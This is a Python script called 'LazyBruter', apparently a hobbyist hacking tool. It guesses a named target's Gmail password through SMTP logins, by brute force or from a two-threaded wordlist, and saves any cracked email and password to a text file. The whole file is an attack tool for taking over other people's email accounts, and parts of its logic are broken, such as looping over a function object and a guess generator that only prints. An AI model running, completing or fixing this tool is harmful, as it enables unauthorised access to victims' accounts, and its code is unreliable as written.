import smtplib
import itertools
import os
from time import sleep
from threading import *

print("         _                           ______                                 ")
print("	| |                         (____  \             _               ")
print("	| |      ____ _____ _   _    ____)  ) ____ _   _| |_  ____  ____ ")
print("	| |     / _  (___  ) | | |  |  __  ( / ___) | | |  _)/ _  )/ ___)")
print("	| |____( ( | |/ __/| |_| |  | |__)  ) |   | |_| | |_( (/ /| |     ")  
print("	|_______)_||_(_____)\__  |  |______/|_|    \____|\___)____)_|   ")
print("	                   (____/                                      ")
																															  
print		("\nThis tool is a bruter tool that is meant to crack email password.")
print                    ("[+] Coded by The Browser Pirates [+]")

smtpserver_gmail = smtplib.SMTP("smtp.gmail.com",587)
smtpserver_gmail.ehlo()
smtpserver_gmail.starttls()

method = input("\nChoose method to attack => (a)Brute Force (b)Dictionary : ")
if method == "a":
    user = input("\nEnter Target's Email Address: ")
    min_pass = int(input("Enter the minimum number of password you want to start the Brute-Force(Default:8): "))
    print ("\nYou are about to attack this email: ",user)
    verify2 = input ("Do you want to continue? [y/n]: ")
    if verify2 == "y" or verify2 == "Y":
        def print_perms(chars, minlen, maxlen): 
            for n in range(minlen, maxlen+1): 
                for perm in itertools.product(chars, repeat=n): 
                    print(''.join(perm)) 
            
    print_perms ("abcdefghijklmnopqrstuvwxyz1234567890!#$%&'*+-/=?^_`{|}~;", min_pass, 90)

    for password in print_perms:
        try:
            smtpserver_gmail.login(user, password)
            print ("[+] Password Cracked: ", password)
            input("Press Enter to save the result in .txt")
            file = open("password cracked.txt","w")
            file.write("Email: ")
            file.write(user)
            file.write("    Password: ")
            file.write(password)
            file.close()
            input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
            break
			
        except smtplib.SMTPAuthenticationError:
            print ("[!] Password Inccorect: ", password)
			
    if verify2 == "n" or verify2 == "N":   
        quit()

if method == "b":
    passwfile = input("Enter the Wordlist Path: ")
    passwfile = open(passwfile, "r")
    reversedpasswfile = input("Enter the Wordlist Path one more time: ")
    with open(reversedpasswfile) as f,  open('reversed_wordlist.txt', 'w') as fout:
        fout.writelines(reversed(f.readlines()))
    reversedpasswfile = open("reversed_wordlist.txt", "r")	

class Core1(Thread):
    def run(self):
        for password in passwfile:
            try:
                smtpserver_gmail.login(user, password)
                break
				
            except smtplib.SMTPAuthenticationError:
                print ("[!] Trying password: ", password)

class Core2(Thread):		
    def run(self):
        for password in reversedpasswfile:
            try:
                smtpserver_gmail.login(user, password)
                break
				
            except smtplib.SMTPAuthenticationError:
                print ("[!] Trying password: ", password)
				
def Stop(self):
    if t1.isAlive():
        t2.join()
        print ("[+] Password Found: ", password)
        input("Press Enter to save the result in .txt")
        file = open("password cracked.txt","w")
        file.write("Email: ")
        file.write(user)
        file.write("    Password: ")
        file.write(password)
        file.close()
        input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")
		
		
    if t2.isAlive():
        t1.join()    
        print ("[+] Password Found: ", password)
        input("Press Enter to save the result in .txt")
        file = open("password cracked.txt","w")
        file.write("Email: ")
        file.write(user)
        file.write("    Password: ")
        file.write(password)
        file.close()
        input("Password saved! Search for <password cracked.txt> in LazyBruter Folder")	
				
user = input("\nEnter Target's Email Address: ")	
print ("\nYou are about to brute force this email: ",user)
verify = input ("Do you want to continue: [y/n]: ")

if verify == "y":
    t1 = Core1()
    t2 = Core2()
	
    t1.start()
    sleep(0.001)
    t2.start()
	
    t1.join()
    t2.join()
    print("2 threads excecuted successfuly.")
